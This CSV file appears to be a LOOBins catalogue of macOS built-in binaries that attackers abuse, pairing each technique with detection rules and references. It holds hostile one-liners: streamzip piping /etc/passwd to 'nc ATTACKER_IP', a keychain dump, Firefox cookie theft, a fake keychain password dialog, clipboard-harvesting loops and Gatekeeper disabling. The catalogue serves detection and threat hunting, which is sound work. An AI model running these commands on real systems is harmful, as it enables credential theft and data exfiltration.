"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"xattr","Jason Trost (@jason_trost)","Display and manipulate extended attributes.","The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.  xattr can be used to bypass Gatekeeper.","2023-04-20","","[''Bypass Gatekeeper via xattr''-|-''Bypass Gatekeeper via xattr'']","[''Use xattr to remove quaratine extended attribute from a file.''-|-''Use xattr to remove quaratine extended attribute from multiple files or directories.'']","[''xattr -d com.apple.quarantine FILE''-|-''xattr -d -r com.apple.quarantine *'']","[''Execution''-|-''Defense Evasion''-|-''Execution''-|-''Defense Evasion'']","[''xattr''-|-''quarantine''-|-''xattr''-|-''quarantine'']","/usr/bin/xattr","","[''Gatekeeper Bypass via Xattr''-|-''Jamf Protect: Detect activity related to xattr and extended attributes'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/xattr_extended_attributes_activity'']","","[''Threat Hunting the macOS edition Megan Carney (Report)''-|-''GrrCon 2018: Threat Hunting the macOS edition Megan Carney'']","[''https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf''-|-''https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be'']","","false"
"tmutil","Brendan Chamberlain (@infosecb)","Manage Time Machine backups.","A tool for managing Time Machine, the native macOS backup utility.","2023-05-01","","[''Disable Time Machine''-|-''Delete a backup''-|-''Restore a backup''-|-''Tamper with system logs''-|-''Exclude path from backup'']","[''The following command disables Time Machine. An attacker can use this to prevent backups from occurring.''-|-''The following command deletes the specified backup. An adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.''-|-''The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted.''-|-''An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+.''-|-''An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.'']","[''tmutil disable''-|-''tmutil delete /path/to/backup''-|-''tmutil restore /path/to/backup''-|-''mkdir /tmp/snapshot tmutil localsnapshot tmutil listlocalsnapshots / mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot open /tmp/snapshot sudo vim /var/log/system.log tmutil restore com.apple.TimeMachine.2023-05-01-090000.local''-|-''tmutil addexclusion /path/to/exclude'']","[''Impact''-|-''Impact''-|-''Collection''-|-''Privilege Escalation''-|-''Defense Evasion'']","[''backup''-|-''delete''-|-''restore''-|-''unprivileged''-|-''backup'']","/usr/bin/tmutil","","[''Jamf Protect: Detect the deletion of localsnapshots''-|-''Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS''-|-''Sigma: Time Machine Backup Disabled Via Tmutil - MacOS''-|-''Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS'']","[''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/tmutil_activity''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml'']","","[''mount_apfs TCC bypass and privilege escalation''-|-''Manage Time Machine backups''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - tmutil'']","[''https://theevilbit.github.io/posts/cve_2020_9771/''-|-''https://github.molgen.mpg.de/pages/bs/macOSnotes/mac/mac_files_tmutil.html''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-0fd'']","","false"
"textutil","ezaspy","Manipulate text files in various formats.","The textutil binary is a command-line utility included in macOS that allows users to manipulate text files of various formats, using the mechanisms provided by the Cocoa text system. Formats include rtf, html, docx and others","2023-05-05","","[''Use the textutil to read several files and build a new file''-|-''Capture clipboard content'']","[''A one-liner can load the content of multiple RTF files in a directory, concatenate their contents, and write the results out as a new file. This provides two sub-use-cases; one is building a malicious file from a collection of smaller files which could evade both network and host-based security controls as the traditional means of signature-based detection would be redundant; two is concatenating the content of several, potentially sensitive files before exfiltration. This command can also be looped to iterate a directory of files.''-|-''By leveraging another command line tool, pbpaste, it is possible to write a one-liner which captures the content of the clipboard. If an attacker already has access to the system, the attacker could run this command to obtain sensitive information such as a password and then elevate their privileges or exfiltrate the information.'']","[''textutil -convert html Quote.doc secondQuote.doc''-|-''pbpaste | textutil -stdin -info > Clipboard.txt'']","[''Defense Evasion''-|-''Collection''-|-''Credential Access''-|-''Collection'']","[''bash''-|-''oneliner''-|-''textutil''-|-''bash''-|-''oneliner''-|-''textutil''-|-''pbpaste''-|-''clipboard'']","/usr/bin/textutil","","Command Line Argument Detection (args contain textutil AND (-convert OR -stdin OR pbpaste))","n/a","","textutil","https://osxdaily.com/tag/textutil/","","false"
"tclsh","Brendan Chamberlain (@infosecB)","Run Tcl files or shell commands from standard input.","tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the ""com.apple.security.cs.disable-library-validation"" entitlement and is capable of loading arbitary plug-ins, framework, and libraries without requiring signed code.","2023-05-17","","Execute malicious dynamic library (.dylib) from standard input","An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.","echo ""load bad.dylib"" | tclsh","Execution","dylib","/usr/bin/tclsh","","Recommendations included in resource below. No formal detection content at this time.","https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c","","Dylib Loads that Tickle your Fancy","https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c","Leo Pitt (@_D00mfist)","false"
"systemsetup","Hare Sudhan (@cyb3rbuff)","Enable remote login, remote apple events for the machine","systemsetup configures certain per-machine settings typically configured in the System Preferences application. The systemsetup command requires at least ""admin"" privileges to run.","2023-08-31","","[''Enable Remote Login''-|-''Enable Remote Apple Events'']","[''systemsetup can be used to enable SSH for remote login''-|-''systemsetup can be used to enable Remote Apple Events.  Set whether the system responds to events sent by other computers (such as AppleScripts). '']","[''sudo systemsetup -setremotelogin on ''-|-''sudo systemsetup -setremoteappleevents on '']","[''Lateral Movement''-|-''Lateral Movement'']","[''ssh''-|-''configuration''-|-''configuration'']","/usr/sbin/systemsetup","","[''Command line argument detection containing (args contain systemsetup AND (-setremoteappleevents OR -setremotelogin) AND on)''-|-''Jamf Protect: Detect systemsetup activity that enables remotelogin or appleremoteevents'']","[''https://www.elastic.co/guide/en/security/current/remote-ssh-login-enabled-via-systemsetup-command.html''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/systemsetup_activity'']","","systemsetup man page","https://ss64.com/osx/systemsetup.html","","false"
"system_profiler","Ethan Nay","Reports system hardware and software configuration.","system_profiler reports on the hardware and software configuration of the system. It can generate plain text reports or XML reports which can be opened with System Information.app","2023-07-12","","[''Listing the available datatypes''-|-''Print hardware information''-|-''Print software information''-|-''Print the information of developer tools''-|-''Print power and battery information'']","[''List all available sub-systems to get information from.''-|-''Prints an overview of the hardware of the current machine, including its model name and serial number.''-|-''Prints an overview of the software of the current machine, including the exact macOS version number.''-|-''Prints the currently active version of the Xcode developer tools and SDK.''-|-''Prints power and battery information, including the current AC wattage and battery cycle count.'']","[''system_profiler -listDataTypes''-|-''system_profiler SPHardwareDataType''-|-''system_profiler SPSoftwareDataType''-|-''system_profiler SPDeveloperToolsDataType''-|-''system_profiler SPPowerDataType'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/sbin/system_profiler","","[''System Information Discovery Using System_Profiler''-|-''Jamf Protect: Detect system_profiler activity that gathers system information'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/system_profiler_activity'']","","[''macOS/binaries/system_profiler''-|-''system_profiler man page'']","[''https://macosbin.com/bin/system_profiler''-|-''https://ss64.com/osx/system_profiler.html'']","","false"
"sysctl","Cedric Owens (@cedowens)","Get macOS hardware model information.","Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine.","2023-04-20","","Use sysctl to gather macOS hardware info.","sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.","sysctl -n hw.model","Discovery","[''bash''-|-''oneliner''-|-''sysctl'']","/usr/sbin/sysctl","","Jamf Protect: Detect activity related to sysctl in an interactive shell","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sysctl_activity","","Evasions: macOS","https://evasions.checkpoint.com/src/MacOS/macos.html","","false"
"sysadminctl","Hare Sudhan (@cyb3rbuff)","Create/delete local accounts, guest account, enable SMB/AFP Guest access.","sysadminctl can administer system user accounts. sysadminctl can be used to change user passwords, create new  users (including automatically provisioning the user home folder) or to check the status of a user's SecureToken.","2024-11-19","","[''Enable Guest Account''-|-''Create Local User Account''-|-''Create a Local Admin Account''-|-''Reset user password''-|-''Delete a local account''-|-''Enable SMB Guest Access''-|-''Enable AFP Guest Access'']","[''sysadminctl can be used to enable the guest account''-|-''sysadminctl can be used to create a local user account''-|-''sysadminctl can be used to create a local admin account''-|-''sysadminctl can be used to reset password for a particular user account''-|-''sysadminctl can delete the specified user account''-|-''sysadminctl can enable SMB Guest Access''-|-''sysadminctl can enable AFP Guest Access'']","[''sudo sysadminctl -guestAccount on ''-|-''sudo sysadminctl -addUser randomUser -password ""randomPassword"" ''-|-''sudo sysadminctl -addUser randomUser -password ""randomPassword"" -admin ''-|-''sudo sysadminctl -resetPasswordFor randomUser -newPassword ""randomPassword"" ''-|-''sudo sysadminctl -deleteUser randomUser ''-|-''sudo sysadminctl -smbGuestAccess on ''-|-''sudo sysadminctl -afpGuestAccess on '']","[''Initial Access''-|-''Persistence''-|-''Persistence''-|-''Persistence''-|-''Impact''-|-''Exfiltration''-|-''Exfiltration'']","[''users''-|-''users''-|-''password''-|-''users''-|-''users'']","/usr/sbin/sysadminctl","","[''Sigma: Creation Of A Local User Account''-|-''Sigma: User Added To Admin Group Via Sysadminctl''-|-''Sigma: Guest Account Enabled Via Sysadminctl'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_create_account.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml'']","","sysadminctl man page","https://ss64.com/mac/sysadminctl.html","","false"
"swift","0v3rride (https://github.com/0v3rride)","Arbitrarily execute swift code from the terminal.","The swift command is an interactive environment (REPL) for Swift.","2023-12-23","","[''Execute Swift code file''-|-''Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1''-|-''Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater'']","[''Executes the Swift code that is in a .swift file''-|-''Executes a Swift one-liner by piping an echoed string into the swift command''-|-''Executes a Swift one-liner that executes the ls command to list the current directory using the -e option that was implemented in swift 5.8 / Xcode 14.3 Beta 1'']","[''swift mycode.swift''-|-''echo 'print(""loobins"")' | swift -''-|-''swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:""/bin/bash""); process.arguments = [""-c"", ""ls -alh""]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));''']","[''Execution''-|-''Execution''-|-''Defense Evasion''-|-''Execution''-|-''Defense Evasion'']","[''swift''-|-''repl''-|-''bash''-|-''zsh''-|-''swift''-|-''repl''-|-''bash''-|-''zsh''-|-''swift''-|-''repl''-|-''bash''-|-''zsh'']","/usr/bin/swift","","[''Process & Command Line Argument Detection (process contains swift)''-|-''Jamf Protect: Detect arbitrary code execution using a swift one-liner'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/swift_oneline_command_execution'']","","[''Introduction to the Swift REPL''-|-''Scripting and Compiling Swift on the Command Line''-|-''Scripting in Swift is Pretty Awesome''-|-''Swift -e runs code directly from the command line''-|-''Swift Programming From The Command Line'']","[''https://developer.apple.com/swift/blog/?id=18''-|-''https://jblevins.org/log/swift''-|-''https://krakendev.io/blog/scripting-in-swift''-|-''https://blog.eidinger.info/swift-e-runs-code-directly-from-the-command-line''-|-''https://ed.com/command-line-swift/'']","","false"
"sw_vers","Eliott (@Koyiott)","Prints macOS version information.","sw_vers prints macOS version information, including the exact macOS version number.","2023-09-11","","[''Retrieving macOS Version Information''-|-''Retrieving macOS Product Version''-|-''Retrieving macOS Product Name''-|-''Retrieving macOS Build Version'']","[''Fetch detailed macOS version information including the build version, product name, and product version.''-|-''Fetch macOS product version.''-|-''Fetch detailed macOS product name.''-|-''Fetch detailed macOS build version.'']","[''sw_vers''-|-''sw_vers -productVersion''-|-''sw_vers -productName''-|-''sw_vers -buildVersion'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''configuration''-|-''bash''-|-''configuration''-|-''bash''-|-''configuration''-|-''bash''-|-''configuration'']","/usr/bin/sw_vers","","No detections at time of publishing","N/A","","[''macOS/binaries/sw_vers''-|-''sw_vers man page'']","[''https://macosbin.com/bin/sw_vers''-|-''https://ss64.com/osx/sw_vers.html'']","","false"
"streamzip","Gabriel De Jesus (0xv1n)","File-less compression of data passed in through stdin.","streamzip is a system utility that can be utilized to compress data from ""stdin"" and write the data directly to ""stdout"", no temporary files are created. The tool can be used by malicious actors to collect and exfiltrate sensitive data without leaving staged data archive artifacts on disk.","2024-07-15","","Copy and compress sensitive data locally","The following command reads file data and compresses the data for exfiltration","dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT","[''Collection''-|-''Exfiltration'']","[''files''-|-''compress'']","/usr/bin/streamzip","","No detection content at time of writing","N/A","","streamzip man page","https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html","","false"
"ssh-keygen","Leo Pitt (@_D00mfist)","Load unsigned dynamic libraries into the ssh-keygen binary.","ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the ""com.apple.security.cs.disable-library-validation"" entitlement and is capable of loading arbitrary libraries without requiring signed code.","2023-05-22","","Execute malicious dynamic library (.dylib) from standard input","An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.","ssh-keygen -D /private/tmp/evil.dylib","[''Execution''-|-''Defense Evasion'']","dylib","/usr/bin/ssh-keygen","","Recommendations included in resource below. No formal detection content at this time.","https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d","","Generate Keys or Generate Dylib Loads?","https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d","","false"
"sqlite3","Brendan Chamberlain (@infosecB)","Query and manage sqlite databases.","sqlite is a command-line utility that allows users to query and manage sqlite databases. Many components of macOS and apps used sqlite to store data. Attackers can leverage this tool to discover sensitive data.","2023-05-23","","[''Get apps with Full Disk access''-|-''Get Firefox cookie data''-|-''View URL associated with file downloads'']","[''The following command interacts with the TCC (Transparency, Consent, and Control) database to show the apps that have Full Disk access permission''-|-''The following one-liner can be used to kill Firefox and dump cookie data from the user's Firefox profile.''-|-''The following sqlite command is commonly used by macOS malware to view the URL in which the payload was downloaded from.'']","[''sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \ 'select client from access where auth_value and service = ""kTCCServiceSystemPolicyAllFiles""'''-|-''killall firefox; find ~/Library/Application\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} ""select * from moz_cookies""''-|-''sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent''']","[''Discovery''-|-''Collection''-|-''Credential Access''-|-''Collection''-|-''Credential Access'']","[''permissions''-|-''oneliner''-|-''cookie-theft''-|-''oneliner''-|-''cookie-theft'']","/usr/bin/sqlite3","","[''Elastic Detection Rules: Potential Privacy Control Bypass via TCCDB Modification''-|-''Splunk Security Content: Suspicious SQLite3 LSQuarantine Behavior''-|-''Jamf Protect: Detect SQLite3 activity used to associated URLs with downloaded files'']","[''https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_privacy_controls_tcc_database_modification.toml''-|-''https://github.com/splunk/security_content/blob/c65dda5c0aa73a97f28c49c20739971ec1ba18a6/dev/endpoint/suspicious_sqlite3_lsquarantine_behavior.yml#L2''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sqlite3_downloads'']","","[''TCC.db Modifier Script''-|-''Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight'']","[''https://github.com/bp88/JSS-Scripts/blob/master/TCC.db%20Modifier.sh''-|-''https://redcanary.com/blog/clipping-silver-sparrows-wings/'']","","false"
"spctl","Brendan Chamberlain (@infosecB)","Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.","Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on the system.","2023-05-23","","Disable Gatekeeper","The --master-disable switch disables Gatekeeper. The command must be run with root/sudo permission.","sudo spctl --master-disable","Defense Evasion","gatekeeper","/usr/sbin/spctl","","[''Elastic Detection Rules: Attempt to Disable Gatekeeper''-|-''Sigma Rules: Disable Security Tools'']","[''https://github.com/elastic/detection-rules/blob/e9baebc2bc18f90ae16501613cd9521a16a38ad7/rules/macos/defense_evasion_attempt_to_disable_gatekeeper.toml''-|-''https://github.com/SigmaHQ/sigma/blob/cd71edc09ca915f389e50df5b1bbb5ecd4b7f89d/rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml'']","","Disable Gatekeeper on macOS Big Sur (11.x)","https://disable-gatekeeper.github.io/","","false"
"softwareupdate","Jonathan Bar Or (@yo_yo_yo_jbo)","Interact with the macOS software update service.","A command-line utility for running software updates.","2023-04-25","","[''Get OS and browser version information''-|-''Get OS update policy'']","[''Determine OS and Safari version by enumerating the available software updates.''-|-''Use the --schedule flag to return the OS update policy.'']","[''softwareupdate --list''-|-''softwareupdate --schedule'']","[''Discovery''-|-''Discovery'']","[''os''-|-''os'']","/usr/sbin/softwareupdate","","No detections at time of publishing","N/A","","softwareupdate Man Page","https://ss64.com/osx/softwareupdate.html","","false"
"sfltool","Eliott (@Koyiott)","Binary to manage the Shared File List framework.","sfltool allows interactions with the Shared File List framework, which can be used to modify application recent documents, favorites, and more.","2023-09-12","","[''Display Login Items''-|-''Reset Login Items to Defaults'']","[''Identify all current login and background items configured on the system.''-|-''Reset all third-party Login Items and revert to installation defaults.'']","[''sfltool dumpbtm''-|-''sfltool resetbtm'']","[''Discovery''-|-''Defense Evasion'']","[''bash''-|-''startup''-|-''bash''-|-''system_reset'']","/usr/bin/sfltool","","Jamf Protect: Detect attempts to dump BTM or being reverted to installation defaults","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sfltool_activity","","[''sfltool man page''-|-''Controlling login and background items'']","[''https://www.unix.com/man-page/mojave/1/sfltool/''-|-''https://eclecticlight.co/2023/02/15/controlling-login-and-background-items-in-ventura/'']","","false"
"security","Pratik Jeware (@Pratik-987), Brendan Chamberlain (@infosecb)","Interact with Keychain, macOS's built-in password manager.","security is a command-line utility included in macOS that allows users to interact with the Keychain app. Keychains allow users to manager passwords and credentials for many services and features, including Wi-Fi and website passwords, secure notes, certificates, and Kerberos.","2023-04-24","","[''Dump credentials, keys, certificates, and other senstive information from Keychain''-|-''Retrieve Chrome's ""Chrome Safe Storage"" password manager secret''-|-''Add an arbitrary trusted certificate to aid a MITM attack'']","[''This command will dump keychain passwords from login.keychain''-|-''This command will retrieve the Chrome Safe Storage password manager secret from the keychain.''-|-''This command will add a certificate to the keychain.'']","[''sudo security dump-keychain -d login.keychain''-|-''security find-generic-password -w -s ""Chrome Safe Storage""''-|-''security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain bad_cert.crt'']","[''Credential Access''-|-''Credential Access''-|-''Defense Evasion'']","[''bash''-|-''bash''-|-''chrome''-|-''bash''-|-''certificate'']","/usr/bin/security","","[''Sigma: Credentials from Password Stores - Keychain''-|-''Elastic: Access to Keychain Credentials Directories''-|-''Elastic: Credential Access Dumping Keychain Security''-|-''Elastic: Keychain Password Retrieval via Command Line''-|-''Jamf Protect: Detect Keychain dumping using security'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_credentials_keychains.toml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_dumping_keychain_security.toml''-|-''https://github.com/elastic/detection-rules/blob/main/rules/macos/credential_access_keychain_pwd_retrieval_security_cmd.toml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/keychain_dumped'']","","[''Using the OS X Keychain to store and retrieve passwords''-|-''SS64 security man page'']","[''https://www.netmeister.org/blog/keychain-passwords.html''-|-''https://ss64.com/osx/security.html'']","","false"
"scutil","Ethan Nay","Display basic network information, check the dns config, set the computer hostname and perform several other tasks.","scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data (using the SystemConfiguration.framework SCDynamicStore APIs) is handled with a set of commands read from standard input.","2023-06-21","","[''DNS configuration''-|-''Proxy configuration''-|-''Network reachability''-|-''Hostname, localhost name and computername'']","[''Get the current DNS configuration of the systems''-|-''Get the current proxy configuration of the systems''-|-''Check if the destination host is reachable from your Mac''-|-''Display the current hostname, localhost name and computername'']","[''scutil --dns''-|-''scutil --proxy''-|-''scutil -r { nodename | address | local-address remote-address }''-|-''scutil --get { HostName | LocalHostName | ComputerName }'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''configuration''-|-''network''-|-''configuration''-|-''configuration'']","/usr/bin/scutil","","No detections at time of publishing","N/A","","[''macOS/binaries/scutil''-|-''scutil man page'']","[''https://macosbin.com/bin/scutil''-|-''https://ss64.com/osx/scutil.html'']","","false"
"screencapture","Brendan Chamberlain (@infosecB)","Capture a screenshot from command line.","A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malicious actors to collect sensitve information from the targeted system.","2023-04-27","","Continously capture screenshots","The following command demonstrates how an attacker can use the tool to capture screenshots every 10 seconds. The -x flag prevents snapshot sounds from being played.","while true; do ts=$(date +""%Y%m%d-%H%M%S""); o=""/tmp/screenshots""; screencapture -x ""$o/ss-$ts.png""; sleep 10; done","Collection","oneliner","/usr/sbin/screencapture","","Sigma: Screen Capture - macOS","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_screencapture.yml","","SS64 screencapture man page","https://ss64.com/osx/screencapture.html","","false"
"say","Pinar Sadioglu (@p_sadioglu)","Convert text to audible speech.","This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the sound output device chosen in System Preferences or save it to an AIFF file.","2023-11-17","","[''Read sensitive data''-|-''Collect clipboard data'']","[''The following command can read and process sensitive files and redirects the output to a file..''-|-''The command is designed to enhance privacy by muting the system volume,using a less recognizable ""Whisper"" voice with the ""say"" command, processing the copied text in the clipboard, and saving the output to a file named ""loot.txt.""'']","[''say -f /home/user/sensitive-files -i  > loot.txt;''-|-''osascript -e 'set volume output muted true' ;   say $(pbpaste) -i  > loot.txt;'']","[''Defense Evasion''-|-''Collection''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Collection'']","[''bash''-|-''pbpaste''-|-''clipboard''-|-''bash''-|-''osascript'']","/usr/bin/say","","No detection content available","N/A","","say man page","https://ss64.com/osx/say.html","","false"
"safaridriver","Brendan Chamberlain (@infosecB)","Enable the WebDriver Safari browser API for Selenium testing.","safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the WebDriver API could be abused by attackers to communicate with external servers for command and control or exfiltration purposes.","2023-05-20","","Enable safaridriver","The following command can be used to enable the WebDriver Safari browser API. The command must be run as root or with sudo privileges.","sudo safaridriver --enable","[''Command and Control''-|-''Exfiltration'']","[''safari''-|-''selenium'']","[''/System/Cryptexes/App/usr/bin/safaridriver''-|-''/usr/bin/safaridriver'']","","No detections at time of publishing","N/A","","[''About WebDriver for Safari''-|-''You Talking To Me?'']","[''https://developer.apple.com/documentation/webkit/about_webdriver_for_safari''-|-''https://starlabs.sg/blog/2021/04-you-talking-to-me/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"profiles","Will Huang (@In0de_16)","List and remove configuration profiles.","Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, bootstraptoken, or enrollment. However, starting from macOS 11.0, this tool cannot be used for installing configuration profiles.","2023-05-16","","[''Collect system DEP information.''-|-''Remove configuration profiles.'']","[''The following command determines whether device is DEP(Device Enrolment Program) enabled and output the DEP information.''-|-''The following command deletes the specified profiles. An optional password used when removing a configuration profile which requires the password removal option.'']","[''sudo profiles show -type enrollment''-|-''profiles remove -identifier com.profile.identifier -password <password>'']","[''Discovery''-|-''Impact'']","[''oneliner''-|-''oneliner'']","/usr/bin/profiles","","No detections at time of publishing.","N/A","","macOS MDM introduction.","https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-mdm","","false"
"plutil","Brendan Chamberlain (@infosecB)","Read, create or edit plist files.","plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by macOS to store a app settings and other configuration info. The utility allows users to check the validity of plist files `plutil -lint`, convert plist files between XML and binary formats (plutil -convert), and add, modify or remove plist key value pairs.","2023-05-07","","Set app to run with dock icon hidden","plutil can be used to set the ""LSUIElement"" attribute to tue which will force the targeted app to run without the UI and dock icon.","plutil -insert LSUIElement -string ""1"" /Applications/TargetApp.app/Contents/Info.plist","Defense Evasion","plist","/usr/bin/plutil","","Splunk Security Content: MacOS plutil","https://research.splunk.com/endpoint/c11f2b57-92c1-4cd2-b46c-064eafb833ac/","","[''Editing Property Lists with plutil''-|-''Plist File Modification (MITRE ATT&CK)'']","[''https://scriptingosx.com/2016/11/editing-property-lists/''-|-''https://attack.mitre.org/techniques/T1647/'']","","false"
"pbpaste","Brendan Chamberlain (@infosecB)","Paste the contents of clipboard to the terminal.","Retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout). The utility is often used for creating new files with the clipboard content or for piping clipboard contents to other commands. It can also be used in shell scripts that may require clipboard content as input.","2023-04-11","","Use pbpaste to collect sensitive clipboard data","A pbpaste bash loop can continously collect clipboard contents every x minutes and write contents to a file (or another location). This may allow an attacker to gather user credentials or collect other sensitive information.","while true; do echo $(pbpaste) >> loot.txt; sleep 10; done","[''Credential Access''-|-''Collection'']","[''bash''-|-''oneliner'']","/usr/bin/pbpaste","","Sigma: Clipboard Data Collection Via Pbpaste","https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml","","[''Hacking macOS: How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - pbpaste'']","[''https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-b65'']","","false"
"osascript","Cedric Owens (@cedowens)","Execute AppleScripts and other OSA language scripts and commands.","The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.","2023-04-19","","[''Use the osascript binary to gather sensitive clipboard data''-|-''Use the osascript binary to gather system information''-|-''Use the osascript binary to prompt the user for credentials''-|-''Use the osascript binary to execute a JXA (JavaScript for Automation) file.'']","[''A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file.''-|-''osascript can be used to gather the operating system version, current username, user ID, computer name, IP address, and other information.''-|-''osascript can be used to generate a dialogue box and request the user to enter the keychain password.''-|-''JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to macOS and can access various internal macOS APIs (such as Cocoa, Foundation, OSAKit, etc.). The osascript binary can be used to execute JXA payloads by simply running ""osascript [file.js]"" but some malware or offensive tools may also use ""osascript -l JavaScript [file.js]"".'']","[''while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done''-|-''osascript -e 'return (system info)'''-|-''osascript -e 'set popup to display dialog ""Keychain Access wants to use the login keychain"" & return & return & ""Please enter the keychain password"" & return default answer """" with icon file ""System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns"" with title ""Authentication Needed"" with hidden answer'''-|-''echo ""ObjC.import('Cocoa');\nObjC.import('stdlib');\nvar currentApp = 